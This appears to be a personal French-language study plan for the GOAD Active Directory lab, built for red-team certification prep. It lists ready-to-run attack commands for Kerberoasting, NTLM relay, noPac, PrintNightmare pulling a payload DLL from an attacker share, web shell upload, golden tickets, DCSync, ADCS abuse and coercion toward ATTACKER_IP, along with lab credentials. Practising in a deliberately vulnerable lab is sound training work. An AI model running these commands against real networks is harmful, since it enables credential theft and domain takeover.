# GOAD — Learning Path & Révision Certifs
HikenRoot Forge | hik3nR00t | Février 2026

================================================================
## RÈGLE D'OR
Un module = Une technique = Un write-up GitHub
Suivre mayfly277 Part 1→14 dans l'ordre — ne pas sauter
================================================================

---

## TABLEAU DE BORD — Où j'en suis

FAIT ✅
- SC-AD-001 : Recon & Initial Foothold (Part 1+2)
- SC-AD-002 : Credential Harvesting (Part 2+3)

EN COURS 🔄
- SC-AD-004 : ACL Abuse Chain — jaime → joffrey en cours
- SC-AD-006 : MSSQL Pivot — BRAAVOS AV bypass bloqué

PROCHAIN ❌ → SC-AD-003 : NTLM Relay & Poisoning (Part 4)

---

## ORDRE DE TRAVAIL (ne pas dévier)

1. SC-AD-003 — NTLM Relay & Poisoning        [Part 4]
2. SC-AD-005 — Privesc locale & domaine       [Part 5+8]
3. SC-AD-006 — MSSQL Pivot (compléter)        [Part 7]
4. SC-AD-007 — Kerberos Delegation            [Part 10]
5. SC-AD-004 — ACL Abuse Chain (compléter)    [Part 11]
6. SC-AD-009 — Domain Dominance               [Part 9+11]
7. SC-AD-010 — Cross-Forest Trusts            [Part 12]
8. SC-AD-011 — Coerce & File-based            [Part 13]
9. SC-AD-008 — ADCS Attacks                   [Part 6]
10. SC-AD-012 — ADCS Avancé                   [Part 14]

---

## MODULES DÉTAILLÉS

================================================================
### SC-AD-001 — Recon & Initial Foothold ✅
Mayfly Part : 1+2
Certifs : CRTP, CRTO
================================================================

OBJECTIF
Cartographier l'environnement AD sans credentials.

TECHNIQUES
- nmap service scan
- netexec smb — netbios, signing, SMBv1
- enum4linux-ng — users, shares, password policy
- LDAP anonyme — users, groups
- BloodHound collect (netexec bloodhound)
- DNS enumeration

COMMANDES CLÉS
netexec smb 192.168.10.0/24
netexec smb 192.168.10.0/24 --users
netexec smb 192.168.10.0/24 --shares
netexec ldap 192.168.10.11 -u '' -p '' --users
netexec smb 192.168.10.0/24 -M bloodhound

RÉSULTAT GOAD
- 5 machines identifiées : KINGSLANDING, WINTERFELL, MEEREEN, CASTELBLACK, BRAAVOS
- 3 domaines : sevenkingdoms.local, north.sevenkingdoms.local, essos.local
- CASTELBLACK + BRAAVOS signing:False → cibles relay

MITRE ATT&CK : T1046, T1087.002, T1018

================================================================
### SC-AD-002 — Credential Harvesting ✅
Mayfly Part : 2+3
Certifs : CRTP, CRTO
================================================================

OBJECTIF
Obtenir des credentials valides sans interaction utilisateur.

TECHNIQUES
- Password in LDAP description
- Password in SYSVOL scripts
- GPP encrypted passwords (SYSVOL)
- AS-REP Roasting (comptes sans pré-auth)
- Kerberoasting (comptes avec SPN)
- Password Spray

COMMANDES CLÉS
# LDAP description
netexec ldap 192.168.10.11 -u '' -p '' -M get-desc-users

# AS-REP Roasting
impacket-GetNPUsers north.sevenkingdoms.local/ -dc-ip 192.168.10.11 -no-pass -usersfile users.txt

# Kerberoasting
impacket-GetUserSPNs north.sevenkingdoms.local/samwell.tarly:PASSWORD -dc-ip 192.168.10.11 -request

# Password Spray
netexec smb 192.168.10.11 -u users.txt -p passwords.txt --no-bruteforce

CREDENTIALS OBTENUS
samwell.tarly  : [LDAP desc]          north.sevenkingdoms.local
brandon.stark  : [AS-REP crack]       north.sevenkingdoms.local
hodor          : hodor                north.sevenkingdoms.local
jon.snow       : [Kerberoast crack]   north.sevenkingdoms.local
jeor.mormont   : [SYSVOL script]      north.sevenkingdoms.local
tywin.lannister: powerkingftw135      sevenkingdoms.local
missandei      : fr3edom              essos.local
viserys.targaryen: GoldCrown          essos.local

MITRE ATT&CK : T1110.003, T1558.003, T1558.004, T1552.006

================================================================
### SC-AD-003 — NTLM Relay & Poisoning ❌ PROCHAIN
Mayfly Part : 4
Certifs : CRTP, CRTO
================================================================

OBJECTIF
Capturer et relayer des hashes NTLM via empoisonnement réseau.
Exploiter CASTELBLACK (signing:False) comme cible de relay.

PRÉREQUIS
- Accès réseau VLAN 10
- CASTELBLACK signing:False confirmé
- Responder installé sur Kali

TECHNIQUES
- LLMNR/NBT-NS Poisoning (Responder)
- NTLM Relay (ntlmrelayx)
- mitm6 (IPv6 poisoning)
- Bots GOAD : robb.stark (3min) + eddard.stark (5min)

COMMANDES CLÉS
# Responder — capture hashes
sudo responder -I eth0 -wf

# ntlmrelayx — relay vers CASTELBLACK
impacket-ntlmrelayx -tf targets.txt -smb2support

# mitm6
sudo mitm6 -d sevenkingdoms.local

# Targets signing:False
echo "192.168.10.22" > targets.txt   # CASTELBLACK
echo "192.168.10.23" >> targets.txt  # BRAAVOS

RÉSULTAT ATTENDU
- Hash NTLMv2 robb.stark capturé → crack hashcat
- Hash NTLMv2 eddard.stark → relay → shell CASTELBLACK

MITRE ATT&CK : T1557.001, T1040

================================================================
### SC-AD-004 — ACL Abuse Chain 🔄 EN COURS
Mayfly Part : 11
Certifs : CRTP, CRTO
================================================================

OBJECTIF
Exploiter des ACL mal configurées pour escalader jusqu'à Domain Admin.

CHAÎNE SEVENKINGDOMS
tywin.lannister
  → ForceChangePassword → jaime.lannister ✅
    → GenericWrite → joffrey.baratheon (Targeted Kerberoast) ✅
      → WriteDACL → tyrion.lannister ❌
        → Self-Membership → Small Council ❌
          → (via lord.varys) → Domain Admins ❌

COMMANDES CLÉS
# ForceChangePassword
bloodyAD -d sevenkingdoms.local -u 'tywin.lannister' -p 'powerkingftw135' --host 192.168.10.10 set password 'jaime.lannister' 'Hacked123!'

# Targeted Kerberoasting via GenericWrite
bloodyAD -d sevenkingdoms.local -u 'jaime.lannister' -p 'Hacked123!' --host 192.168.10.10 set object 'joffrey.baratheon' 'servicePrincipalName' -v 'MSSQLSvc/pwned.sevenkingdoms.local:1433'
impacket-GetUserSPNs sevenkingdoms.local/jaime.lannister:'Hacked123!' -dc-ip 192.168.10.10 -request -outputfile joffrey_tgs.txt

# WriteDACL
dacledit.py -action write -rights FullControl -principal tyrion.lannister -target joffrey.baratheon 'sevenkingdoms.local/joffrey.baratheon:PASSWORD'

MITRE ATT&CK : T1484.001, T1558.003

================================================================
### SC-AD-005 — Privesc locale & domaine ❌
Mayfly Part : 5+8
Certifs : CRTP, CRTO
================================================================

OBJECTIF
Escalader depuis user standard vers SYSTEM / Domain Admin.

TECHNIQUES
- SamAccountName Impersonation (CVE-2021-42278 / noPac)
- PrintNightmare (CVE-2021-1675)
- KrbRelayUp (LDAP signing not enforced)
- IIS WebShell upload (CASTELBLACK port 80)

COMMANDES CLÉS
# noPac
python3 noPac.py -dc-ip 192.168.10.11 north.sevenkingdoms.local/hodor:hodor -shell

# PrintNightmare
python3 CVE-2021-1675.py north.sevenkingdoms.local/hodor:hodor@192.168.10.22 '\\ATTACKER\share\payload.dll'

# IIS upload CASTELBLACK
curl http://192.168.10.22/upload -F "file=@shell.aspx"

MITRE ATT&CK : T1068, T1190

================================================================
### SC-AD-006 — MSSQL Pivot 🔄 PARTIEL
Mayfly Part : 7
Certifs : CRTP, CRTO
================================================================

OBJECTIF
Pivoter via MSSQL linked servers pour obtenir RCE inter-domaines.

CHAÎNE
samwell.tarly → CASTELBLACK (sa via impersonate) ✅
arya.stark → CASTELBLACK (dbo via execute as user) ✅
CASTELBLACK → BRAAVOS (linked server, jon.snow → sa) ✅
BRAAVOS xp_cmdshell → RCE ❌ (bloqué Defender)

COMMANDES CLÉS
# Connexion MSSQL
impacket-mssqlclient north.sevenkingdoms.local/samwell.tarly:PASSWORD@192.168.10.22

# Enum
SQL> enum_impersonate
SQL> exec_as_login sa
SQL> enum_links
SQL> use_link BRAAVOS

# xp_cmdshell
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami

MITRE ATT&CK : T1210, T1021.002

================================================================
### SC-AD-007 — Kerberos Delegation ❌
Mayfly Part : 10
Certifs : CRTP, CRTO, CRTE
================================================================

OBJECTIF
Abuser des délégations Kerberos pour usurper l'identité d'admin.

TECHNIQUES
- Unconstrained Delegation — sansa.stark → capture TGT
- Constrained Delegation S4U2Self + S4U2Proxy → impersonate DA
- RBCD — Resource-Based Constrained Delegation
- Shadow Credentials — msDS-KeyCredentialLink

COMMANDES CLÉS
# Unconstrained — trouver machines avec unconstrained
impacket-findDelegation north.sevenkingdoms.local/samwell.tarly:PASSWORD -dc-ip 192.168.10.11

# Constrained — S4U2Proxy
impacket-getST -spn cifs/WINTERFELL.north.sevenkingdoms.local north.sevenkingdoms.local/jon.snow -impersonate administrator -dc-ip 192.168.10.11

# RBCD
impacket-rbcd -action write -delegate-from 'ATTACKER$' -delegate-to 'CASTELBLACK$' north.sevenkingdoms.local/samwell.tarly:PASSWORD

MITRE ATT&CK : T1558.001, T1550.003

================================================================
### SC-AD-008 — ADCS Attacks ❌
Mayfly Part : 6
Certifs : CRTE
================================================================

OBJECTIF
Exploiter Active Directory Certificate Services pour obtenir DA.

TECHNIQUES
- ESC1 : Template ENROLLEE_SUPPLIES_SUBJECT + enroll rights
- ESC4 : GenericAll sur template → modifier → ESC1
- ESC6 : EDITF_ATTRIBUTESUBJECTALTNAME2 sur CA
- ESC8 : NTLM relay vers web enrollment → cert DC → DCSync
- Certifried (CVE-2022-26923)
- Shadow Credentials via ADCS

COMMANDES CLÉS
# Enumération
certipy find -u 'missandei@essos.local' -p 'fr3edom' -dc-ip 192.168.10.12 -stdout

# ESC1
certipy req -u 'missandei@essos.local' -p 'fr3edom' -ca ESSOS-CA -template VulnTemplate -upn administrator@essos.local

# ESC8 — relay PetitPotam → cert
impacket-ntlmrelayx -t http://192.168.10.23/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

MITRE ATT&CK : T1649, T1558

================================================================
### SC-AD-009 — Domain Dominance ❌
Mayfly Part : 9+11
Certifs : CRTP, CRTO
================================================================

OBJECTIF
Maintenir l'accès et atteindre la persistance post-DA.

TECHNIQUES
- DCSync — extraction NTDS.dit
- Golden Ticket — TGT forgé avec krbtgt hash
- Silver Ticket — TGS forgé pour service spécifique
- AdminSDHolder — persistance ACL sur groupes protégés
- DSRM account — backdoor DC local admin
- Skeleton Key

COMMANDES CLÉS
# DCSync
impacket-secretsdump -just-dc sevenkingdoms.local/administrator@192.168.10.10 -hashes :NTLM_HASH

# Golden Ticket
impacket-ticketer -nthash KRBTGT_HASH -domain-sid DOMAIN_SID -domain sevenkingdoms.local administrator
export KRB5CCNAME=administrator.ccache

# Silver Ticket
impacket-ticketer -nthash SERVICE_HASH -domain-sid DOMAIN_SID -domain sevenkingdoms.local -spn cifs/KINGSLANDING administrator

MITRE ATT&CK : T1003.006, T1558.001, T1558.002

================================================================
### SC-AD-010 — Cross-Forest Trusts ❌
Mayfly Part : 12
Certifs : CRTO, CRTE
================================================================

OBJECTIF
Pivoter entre forêts via les relations de confiance.

TRUSTS GOAD
north.sevenkingdoms.local ↔ sevenkingdoms.local (parent-child)
sevenkingdoms.local ↔ essos.local (cross-forest)

TECHNIQUES
- Enum trusts et SID Filtering
- Cross-forest TGT avec trust key
- SID History injection (ExtraSids)
- Kerberos inter-forest routing

COMMANDES CLÉS
# Enum trusts
impacket-GetADUsers -all north.sevenkingdoms.local/samwell.tarly:PASSWORD -dc-ip 192.168.10.11

# Cross-forest ticket
impacket-ticketer -nthash TRUST_KEY -domain-sid NORTH_SID -domain north.sevenkingdoms.local -extra-sid SEVENKINGDOMS_DA_SID administrator

MITRE ATT&CK : T1482, T1550.003

================================================================
### SC-AD-011 — Coerce & File-based ❌
Mayfly Part : 13
Certifs : CRTO
================================================================

OBJECTIF
Forcer des authentifications NTLM via fichiers malveillants et coercion.

TECHNIQUES
- .searchConnector-ms — déclenche WebClient
- PetitPotam (coerce DC)
- PrinterBug / SpoolSample
- .lnk / .url malveillant
- WebDAV + NTLM relay

COMMANDES CLÉS
# PetitPotam
python3 PetitPotam.py -u '' -p '' ATTACKER_IP 192.168.10.10

# PrinterBug
python3 printerbug.py sevenkingdoms.local/tywin.lannister:powerkingftw135@192.168.10.10 ATTACKER_IP

# Drop searchConnector-ms via netexec
netexec smb 192.168.10.22 -u 'samwell.tarly' -p PASSWORD -M drop-sc -o SHARE=all URL=\\\\ATTACKER_IP\\share

MITRE ATT&CK : T1187, T1557

================================================================
### SC-AD-012 — ADCS Avancé ❌
Mayfly Part : 14
Certifs : CRTE
================================================================

OBJECTIF
Exploiter les vulnérabilités ADCS avancées (ESC5 à ESC15).

TECHNIQUES
- ESC5 : Child-to-parent via PKI Object Control
- ESC7 : CA Officer privilege abuse
- ESC9/ESC10 : StrongCertificateBindingEnforcement bypass
- ESC11 : ICPR relay (non-HTTP)
- ESC13 : Universal group membership in certificate
- ESC14 : AltSecurityIdentities mapping

COMMANDES CLÉS
# Enum avancée (certipy-merged requis)
certipy-merged find -u 'viserys.targaryen@essos.local' -p 'GoldCrown' -dc-ip 192.168.10.12 -stdout

# ESC7 — Officer privilege
certipy ca -u 'viserys.targaryen@essos.local' -p 'GoldCrown' -ca ESSOS-CA -add-officer viserys.targaryen -dc-ip 192.168.10.12

MITRE ATT&CK : T1649

---

## INFRASTRUCTURE GOAD — RÉFÉRENCE RAPIDE

MACHINES
192.168.10.10  KINGSLANDING   sevenkingdoms.local          DC01  signing:True
192.168.10.11  WINTERFELL     north.sevenkingdoms.local    DC02  signing:True
192.168.10.12  MEEREEN        essos.local                  DC03  signing:True  SMBv1
192.168.10.22  CASTELBLACK    north.sevenkingdoms.local    SRV   signing:FALSE ← RELAY
192.168.10.23  BRAAVOS        essos.local                  SRV   signing:FALSE ← RELAY

BOTS ACTIFS (pour Responder / Relay)
- robb.stark : tente connexion SMB toutes les 3 minutes
- eddard.stark : tente connexion SMB toutes les 5 minutes

CREDENTIALS CONNUS
samwell.tarly  : [voir write-up]     north.sevenkingdoms.local
brandon.stark  : [voir write-up]     north.sevenkingdoms.local
hodor          : hodor               north.sevenkingdoms.local
jon.snow       : [voir write-up]     north.sevenkingdoms.local
jeor.mormont   : [voir write-up]     north.sevenkingdoms.local
tywin.lannister: powerkingftw135     sevenkingdoms.local
jaime.lannister: Hacked123!          sevenkingdoms.local
missandei      : fr3edom             essos.local
viserys.targaryen: GoldCrown         essos.local

---

## LIENS RAPIDES

GitHub AD Lab    : https://github.com/hikenroot/hikenroot-forge/tree/main/docs/labs/ad-lab
Mayfly Part 1    : https://mayfly277.github.io/posts/GOADv2-pwning_part1/
Mayfly Part 4    : https://mayfly277.github.io/posts/GOADv2-pwning-part4/
GOAD Source      : https://github.com/Orange-Cyberdefense/GOAD
CRTP Syllabus    : https://www.alteredsecurity.com/adlab
CRTO Syllabus    : https://www.zeropointsecurity.co.uk/course/red-team-ops
HackTricks AD    : https://book.hacktricks.xyz/windows-hardening/active-directory-methodology

---

Auteur : Nadyr Chouarhi (hik3nR00t) | HikenRoot Forge | Février 2026
Dernière mise à jour : 26 février 2026
